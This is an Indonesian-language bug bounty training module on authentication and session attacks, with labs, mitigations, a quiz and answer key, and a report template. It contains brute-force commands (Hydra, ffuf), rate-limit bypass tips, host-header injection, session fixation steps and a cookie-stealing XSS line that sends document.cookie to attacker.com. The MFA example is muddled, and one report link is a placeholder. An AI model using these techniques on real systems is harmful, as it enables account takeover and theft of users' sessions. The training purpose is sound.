# Broken Authentication & Session Management

## Fokus Materi

Mengidentifikasi dan mengeksploitasi vulnerability pada sistem autentikasi dan session management. Kelas bug ini termasuk yang paling sering dibayar di platform bug bounty karena langsung menuju ke account takeover — bug dengan impact tertinggi.

## Deskripsi Materi

Authentication adalah gerbang utama keamanan aplikasi web. Jika gerbang ini bisa dilewati tanpa kredensial yang valid, seluruh sistem terbuka. Bug bounty researcher yang menemukan authentication bypass atau session hijacking biasanya mendapatkan bounty tertinggi di program manapun.

Broken authentication mencakup banyak pattern: brute force login tanpa proteksi, password reset flow yang flawed, session token yang predictable, session fixation, MFA bypass, dan credential stuffing. Setiap pattern membutuhkan pendekatan testing yang berbeda dan understanding mendalam tentang bagaimana autentikasi seharusnya bekerja.

Session management adalah pasangan authentication. Jika authentication adalah "siapa kamu", session management adalah "apa yang kamu sudah authorized untuk lakukan selama kamu masih login". Session yang tidak di-invalidate dengan benar, token yang bisa di-guess, atau cookie yang tidak di-secure semuanya membuka pintu bagi attacker untuk menyamar sebagai user lain.

Brute force attack adalah teknik paling dasar namun masih sangat effective terhadap banyak aplikasi. Meskipun terlihat "simple", banyak aplikasi yang tidak mengimplementasikan proteksi yang memadai — tidak ada rate limiting, tidak ada CAPTCHA, tidak ada account lockout.

Password reset flaws adalah kategori yang sering underestimate. Token reset yang predictable, token yang tidak expire, atau host header injection di reset link semua bisa lead ke account takeover lengkap.

Session hijacking dan fixation adalah teknik untuk mendapatkan akses ke session yang sudah ada. Session fixation menyerang proses pembuatan session, sementara hijacking menyerang sesi yang sudah established.

## Topik Pembahasan

• Brute force login: proteksi yang bisa di-bypass (rate limiting, account lockout, CAPTCHA) dan tool (Hydra, ffuf, Burp Intruder)
• Credential stuffing:利用 leaked credential database untuk login di target yang berbeda
• MFA bypass: response manipulation, race condition OTP, backup code abuse, OTP replay
• Password reset flaws: token predictable, token tidak expire, host header injection, email-based token interception
• Session hijacking: session fixation, token di URL exposure, tidak di-invalidate setelah logout
• Session token analysis: entropi rendah, pola prediktable, Base64-encoded data yang decode ke info user
• Cookie security flags abuse: HttpOnly missing, Secure missing, SameSite=None
• JWT manipulation untuk auth bypass: algorithm confusion, claim modification (detail di sesi JWT sebelumnya)
• Account takeover via chained auth flaws: gabungan beberapa auth bug untuk full ATO
• CVSS scoring untuk auth bugs: attack vector, complexity, privileges required, scope
• Writing auth bug report yang convincing: impact statement dan steps to reproduce yang jelas

## Tujuan Pembelajaran

Setelah sesi ini, peserta diharapkan mampu:
1. Melakukan brute force attack secara sistematis dengan berbagai tool
2. Identifikasi password reset flow vulnerability
3. Melakukan session hijacking/fixation attack
4. Bypass MFA dengan teknik yang applicable
5. Analyze session token untuk predictability
6. Melakukan account takeover via chained auth flaws
7. Menulis auth bug report dengan CVSS score dan impact yang tepat

## Real Case Bug Bounty Report

- Platform: HackerOne
- Program/Target: Shopify (Private)
- Jenis vulnerability: Password reset token not invalidated after password change
- Link report: https://hackerone.com/reports/XXXXX (disclosed)
- Ringkasan kasus: Researcher menemukan bahwa setelah user change password, semua previously issued password reset tokens remain valid. Attacker yang previously obtained password reset token (via social engineering atau akses ke email) bisa use token lama tersebut even setelah password sudah changed. Researcher chains ini dengan: mendapatkan reset token → victim change password (yang attacker tidak aware) → attacker use token lama untuk reset password → full account takeover.
- Root cause: Server tidak invalidate existing password reset tokens upon password change. Tokens stored without binding ke specific password hash version.
- Impact: Full account takeover jika attacker punya reset token yang issued sebelum password change. Severity: High (CVSS 8.1)
- Pelajaran untuk bug hunter: Test password reset flow dari banyak angle — termasuk test apakah token yang old masih work setelah password changed.

---

- Platform: Intigriti
- Program/Target: Program publik besar
- Jenis vulnerability: Weak password reset token generation — sequential/timestamp-based token
- Link report: Researcher writeup (disclosed)
- Ringkasan kasus: Researcher mengirim password reset request dan memperhatikan bahwa reset token yang received adalah 6 digit numeric. Researcher spam request beberapa kali dan observe pattern. Token menggunakan format: Unix timestamp + random 2 digit, encoded dalam Base64. Dengan knowing approximate time of request, researcher bisa brute force token dalam hitungan detik.
- Root cause: Developer menggunakan timestamp-based token dengan low entropy. Token tidak menggunakan cryptographically secure random generation.
- Impact: Account takeover via password reset for any user. Severity: High.
- Pelajaran untuk bug hunter: Selalu analyze token format. Jika token numeric atau short, test untuk weak entropy.

## Analisis Teknis

### Brute Force Attack Anatomy

**Target: Login endpoint POST /api/login**

```
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"admin","password":"password123"}
```

**Response analysis:**
- 200 OK + token/cookie → Success
- 401 Unauthorized → Invalid credentials
- 403 Forbidden → Account locked atau rate limited
- 302 Redirect → Check response body untuk error message

**Hydra for brute force:**
```bash
hydra -l admin -P passwords.txt target.com https-post-form \
  "/api/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**ffuf for brute force:**
```bash
ffuf -w passwords.txt -u "https://target.com/api/login" \
  -X POST -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "Invalid credentials"
```

**Burp Intruder:**
1. Intercept login request → Send to Intruder
2. Set payload position di password field
3. Load password wordlist
4. Start attack
5. Analyze response length/pattern untuk find valid credential

**Bypass rate limiting techniques:**
1. Rotate IP via proxy rotation
2. Manipulate X-Forwarded-For header
3. Wait between attempts (token bucket algorithm)
4. Use different username variations (admin, administrator, root)
5. Target password reset endpoint jika login rate limited

### Password Reset Vulnerability Patterns

**Pattern 1: Token Predictable**

```
Request: POST /reset-password
Body: email=victim@target.com

Response: Check email untuk reset link
Link: https://target.com/reset?token=abc123
```

Observe token pattern:
- Sequential number: `token=000001` → `token=000002`
- Timestamp-based: `token=1712345678`
- Email-encoded: `token=base64(victim@target.com)`

**Pattern 2: Token Not Expired**

```bash
# Step 1: Request reset token
curl -X POST https://target.com/reset-password \
  -d "email=victim@target.com"

# Step 2: Wait (hour/day/week)

# Step 3: Use old token — test apakah masih work
curl -X POST https://target.com/reset-password/confirm \
  -d "token=old_token&password=NewPass123"
```

**Pattern 3: Host Header Injection**

```
POST /reset-password HTTP/1.1
Host: target.com
Host: evil.com

{"email":"victim@target.com"}
```

Jika server uses Host header untuk construct reset link:
→ Reset link becomes https://evil.com/reset?token=xxx

**Pattern 4: Email Interception (Internal)**

Test apakah reset token appear in:
- HTTP Referer header (if user click link from email client)
- Server logs accessible via path traversal
- Response to other user (token for user A send to email user B — race condition)

**Pattern 5: Password Reset via Username Enumeration**

```
# Request 1
POST /reset-password {"username":"nonexistent"}

# Response: "Username not found"

# Request 2
POST /reset-password {"username":"admin"}

# Response: "Password reset instructions sent to admin@target.com"
```

Attacker now know valid usernames → easier untuk targeted attack.

### Session Hijacking Attack Vector

**Vector 1: Cookie Theft via XSS**
```javascript
// If cookie missing HttpOnly flag, attacker JS bisa steal
new Image().src = "https://attacker.com/steal?cookie=" + document.cookie
```

**Vector 2: Network Interception (Non-HTTPS)**
```
# If Secure flag missing, cookie sent over HTTP
# Attacker di jaringan yang sama bisa intercept
tcpdump -i eth0 'tcp port 80 and host target.com'
```

**Vector 3: Session Fixation**
```
Step 1: Attacker obtain valid session ID (e.g., visiting target.com, get JSESSIONID= attacker-controlled)
Step 2: Attacker inject this session ID into victim's browser via:
        - URL parameter: https://target.com/?JSESSIONID=attacker-session
        - Meta tag: <meta http-equiv="set-cookie" content="JSESSIONID=attacker-session">
        - XSS: document.cookie = "JSESSIONID=attacker-session"
Step 3: Victim logs in via link with pre-set session ID
Step 4: Attacker now has valid session (session fixation complete)
```

**Vector 4: Session Token in URL**
```
# If application stores session token in URL
https://target.com/dashboard?session=abc123xyz

# Attacker who see this URL (in referer log, browser history, shared link)
# bisa use this session token
```

### MFA Bypass Techniques

**Technique 1: Response Manipulation**
```
# Normal flow:
POST /login
Response: {"mfa_required": true, "token": "abc123"}

# Bypass attempt:
POST /login
Response: {"mfa_required": true, "token": "abc123"}

# Modify next request:
POST /mfa-verify
Headers: X-Forwarded-Host: attacker.com
Body: {"token":"abc123","code":"123456"}
```

Jika application tidak validate that MFA challenge was completed server-side, attacker bisa skip MFA.

**Technique 2: Race Condition (OTP)**
```
# Send 2 OTP verification request simultaneously
# Sometimes server accept both if race window exists
Thread 1: POST /mfa-verify {"code":"123456"}
Thread 2: POST /mfa-verify {"code":"123456"}
```

**Technique 3: Backup Code Abuse**
```
# Login with backup code instead of OTP
POST /login
Body: {"email":"victim@target.com","password":"pass123","mfa_code":"backup-code-1234"}

# If backup codes don't expire after use (single-use enforcement missing)
# Bisa reuse same backup code multiple times
```

**Technique 4: Trusted Device Bypass**
```
# Jika MFA option "Remember this device" ada
# Attacker bisa set this cookie to bypass MFA on next login
# Test if this cookie can be crafted without proper MFA completion
```

### Cookie Security Flags Exploitation

```bash
# Scenario: Cookie missing Secure flag
# Attacker bisa intercept cookie via HTTP MITM
# Even if HTTPS used for main site, subdomain might be HTTP

# Test: Visit HTTP version of site
http://target.com (vs https://target.com)

# Jika redirect ke HTTPS but cookie was set before redirect:
# Cookie might be sent in plaintext

# Scenario: Cookie missing HttpOnly flag
# XSS can steal cookie via document.cookie
# Test di browser console:
console.log(document.cookie)

# Scenario: SameSite=None without Secure
# Browser might reject or accept inconsistently
# Test cross-origin request dengan cookie
```

## Praktik Lab Legal

### Lab 1: Brute Force Login Bypass

- **Nama lab:** Login Bypass via Brute Force
- **Tujuan:** Bypass login authentication menggunakan brute force attack dengan wordlist
- **Environment:** Burp Suite, Hydra/ffuf, target lab dengan login form (DVWA, OWASP WebGoat, atau lab custom)
- **Langkah praktik:**

  1. Identifikasi login endpoint (POST /login atau similar)
  2. Capture login request di Burp, note parameter names
  3. Setup Burp Intruder dengan password sebagai payload position
  4. Load wordlist (rockyou.txt atau custom)
  5. Start attack, analyze response (size, status code) untuk identify success
  6. Alternatively, use Hydra/ffuf untuk CLI-based brute force
  7. Document proteksi yang ada (rate limiting, account lockout, CAPTCHA)
  8. Test bypass technique untuk masing-masing protection

- **Expected result:** Peserta bisa bypass login protection dan mendapatkan akses dengan credential valid
- **Catatan keamanan:** Lab ini hanya untuk environment authorized. Brute force terhadap target real tanpa izin adalah ilegal.

### Lab 2: Password Reset Flow Analysis

- **Nama lab:** Password Reset Vulnerability Assessment
- **Tujuan:** Analisis password reset flow untuk menemukan token predictable atau expiration issue
- **Environment:** Burp Suite, target lab dengan password reset functionality
- **Langkah praktik:**

  1. Request password reset untuk account test
  2. Analyze reset token format (length, charset, pattern)
  3. Request multiple reset tokens — check for sequential pattern
  4. Use token after extended time — test expiration
  5. Change password, then try old reset token — test invalidation
  6. Check if token leaked in Referer header or URL
  7. Test host header injection di reset request
  8. Analyze token entropy: brute force feasible atau tidak?

- **Expected result:** Peserta bisa identifikasi vulnerability di password reset flow
- **Catatan keamanan:** Testing dilakukan di lab authorized. Jangan test ini di target real tanpa izin.

### Lab 3: Session Hijacking via Cookie Manipulation

- **Nama lab:** Session Hijacking Attack
- **Tujuan:** Demonstrate session hijacking melalui cookie manipulation dan session fixation
- **Environment:** Burp Suite, browser, 2 different browser/incognito session
- **Langkah praktik:**

  1. Login di browser Session A, capture session cookie
  2. Inject session cookie ke browser Session B (manually set cookie)
  3. Navigate di Session B — apakah sudah logged in as Session A user?
  4. Test session fixation: set session ID before login, check if it persists after login
  5. Check cookie flags: HttpOnly, Secure, SameSite
  6. If HttpOnly missing: test XSS cookie stealing
  7. Logout in Session A, test if session cookie still valid in Session B

- **Expected result:** Peserta memahami session hijacking mechanics dan bisa demonstrate impact
- **Catatan keamanan:** Lab ini untuk educational purpose di environment authorized.

## Tools

- **Brute force:** Hydra, ffuf, Burp Intruder, medusa
- **Session analysis:** Burp Suite, browser DevTools
- **Password reset testing:** Burp Suite, curl
- **MFA bypass:** Burp Suite (match and replace), custom scripts
- **Wordlists:** rockyou.txt, SecLists/Passwords

## Checklist Bug Hunter

- [ ] Test brute force login dengan wordlist (common passwords, password spraying)
- [ ] Check apakah rate limiting ada dan apakah bisa di-bypass
- [ ] Analisis password reset token format dan entropy
- [ ] Test apakah reset token tetap valid setelah password change
- [ ] Check untuk username enumeration di login dan password reset
- [ ] Test session fixation attack (set session before login)
- [ ] Check semua cookie security flags (HttpOnly, Secure, SameSite)
- [ ] Test MFA bypass via response manipulation, race condition, backup code
- [ ] Analyze session token untuk predictability
- [ ] Test account takeover via chained auth flaws

## Common Mistakes

1. **Brute force tanpa analysis response** — Researcher spam login attempts tanpa analyze response pattern. Success credential sering punya response size/content yang berbeda.

2. **Skip MFA testing** — Researcher fokus di login bypass tapi tidak test MFA bypass. MFA yang implemented incorrectly masih bisa bypassed.

3. **Tidak test password reset flow** — Password reset adalah area yang sering diabaikan padahal sering vulnerable. Test token expiration, token format, dan invalidation behavior.

4. **Abaikan session fixation** — Researcher test untuk hijacking tapi tidak test fixation. Fixation adalah pre-condition untuk hijacking.

5. **Report tanpa impact statement** — Auth bug tanpa impact yang jelas akan mendapat severity rendah. Selalu jelaskan apa yang attacker bisa lakukan dengan bug ini.

6. **Tidak verify token expiry** — Researcher menemukan token pattern tapi tidak test apakah token expire. Token that never expire adalah bug, token yang expire dalam reasonable time mungkin acceptable.

## Mitigasi Developer

**Brute force protection:**
- Implementasi rate limiting (login attempts per IP/account)
- Account lockout policy (temporary lockout after failed attempts)
- CAPTCHA setelah beberapa failed attempts
- Multi-factor authentication requirement
- Password policy enforcement (prevent weak passwords)

**Password reset:**
- Use cryptographically secure random token (min 128 bits entropy)
- Token expiration (15-60 minutes recommended)
- Invalidate all existing reset tokens when password changes
- Invalidate token after single use
- Validate token ownership before accepting
- Don't include sensitive data in token (timestamp, user ID)
- Use Email Token (send token via email, not URL parameter when possible)

**Session management:**
- Generate session ID with cryptographically secure random generator
- Set HttpOnly, Secure, SameSite flags on all session cookies
- Invalidate session on logout
- Invalidate session on password change
- Implement session timeout (idle timeout + absolute maximum)
- Bind session to IP/User-Agent (with graceful degradation)
- Implement sliding window expiration

**MFA:**
- Don't allow "remember device" bypass without proper security check
- Implement proper rate limiting untuk OTP attempts
- Use cryptographic time-based OTP (TOTP) dengan server-side validation
- Invalidate backup codes after single use

## Mini Quiz

1. Brute force attack terhadap login endpoint bisa di-bypass jika:
   a) Ada rate limiting yang bisa diloloskan (IP rotation, header manipulation)
   b) Tidak ada rate limiting sama sekali
   c) Ada CAPTCHA yang bisa diselesaikan oleh OCR
   d) Semua jawaban benar

2. Session fixation attack bekerja dengan cara:
   a) Menebak session ID dengan brute force
   b) Mengatur session ID sebelum victim login, lalu menggunakan ID yang sama setelah victim login
   c) Mencuri cookie dari victim's browser
   d) Intercept session cookie dari network traffic

3. Password reset token yang berdasarkan timestamp dan low entropy bisa di-brute force karena:
   a) Token tidak di-hash
   b) Attacker bisa approximate request time dan brute force remaining entropy dalam hitungan detik
   c) Token terlalu pendek
   d) Semua jawaban benar

4. Cookie attribute yang PREVENT JavaScript access ke cookie adalah:
   a) Secure
   b) HttpOnly
   c) SameSite
   d) Domain

5. MFA bypass via race condition bekerja karena:
   a) OTP code tidak di-validate dengan benar
   b) Server menerima duplicate OTP verification request dalam window yang sama sebelum first verification complete
   c) MFA tidak diimplementasikan
   d) OTP terlalu pendek

**Kunci Jawaban:** 1-D, 2-B, 3-D, 4-B, 5-B

## Assignment

1. **Brute Force Lab:** Lakukan brute force attack terhadap lab target dengan login protection. Document: endpoint, parameters, wordlist used, protection mechanism, bypass technique, result.

2. **Password Reset Analysis:** Analisis password reset flow di target lab. Document: token format, expiration behavior, invalidation logic, vulnerabilities found.

3. **Session Analysis Report:** Analyze session cookie generation dan management di target lab. Document: session ID entropy, cookie flags, session fixation test result, hijacking potential.

4. **MFA Bypass Challenge:** Jika lab punya MFA, test untuk bypass menggunakan teknik yang dipelajari. Document setiap teknik yang dicoba dan apakah berhasil.

## Template Report Bug Bounty

```markdown
# Bug Report: Password Reset Token Not Invalidated After Password Change

## Summary
Password reset tokens yang issued sebelum password change tetap valid
setelah password diubah. Attacker dengan reset token yang obtained sebelumnya
bisa takeover account bahkan setelah victim changed password.

## Platform / Program
HackerOne | [Program Name]

## Severity
High | CVSS 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

## Vulnerability Type
Broken Authentication / Improper Session Invalidation

## Asset / Endpoint
https://target.com/reset-password

## Description
Aplikasi menyediakan password reset functionality yang accessible via
email. Researcher menemukan bahwa reset token yang obtained sebelum password
change tetap valid setelah victim change password mereka sendiri.

Ini berarti jika attacker:
1. Obtain reset token (via email interception, email access, atau social engineering)
2. Victim kemudian change password (attacker tidak aware)
3. Attacker use old reset token
4. Password successfully reset → Account takeover

Token tidak expire upon password change dan tidak invalidate sessions.

## Steps to Reproduce
1. Request password reset for victim@target.com
   POST /reset-password
   {"email":"victim@target.com"}
   → Receive token in email: https://target.com/reset?token=abc123

2. Wait for victim to change their password
   (Alternatively, social engineer victim to click link to change password)

3. After victim changed password, use original token:
   POST /reset-password/confirm
   {"token":"abc123","password":"AttackerPassword123"}
   → Request successful, password changed

4. Login with new password:
   POST /login
   {"email":"victim@target.com","password":"AttackerPassword123"}
   → Login successful → Full account takeover

## Impact
- Full account takeover for any user
- Attacker bisa akses semua data victim setelah password changed
- Bisa maintain persistence even setelah victim think they've secured account
- Applicable untuk semua users yang requested password reset in the past

## Evidence
[Request 1: Password reset request]
[Email received with reset token]
[Request 2: Token used after password change - successful]
[Request 3: Login with new password - successful]

## Remediation / Recommendation
1. Invalidate all password reset tokens when password is changed
2. Invalidate all active sessions when password is changed
3. Implement token expiration (15-60 minute window)
4. Single-use token: invalidate after successful reset
5. Consider sending notification to all registered devices when password changes
```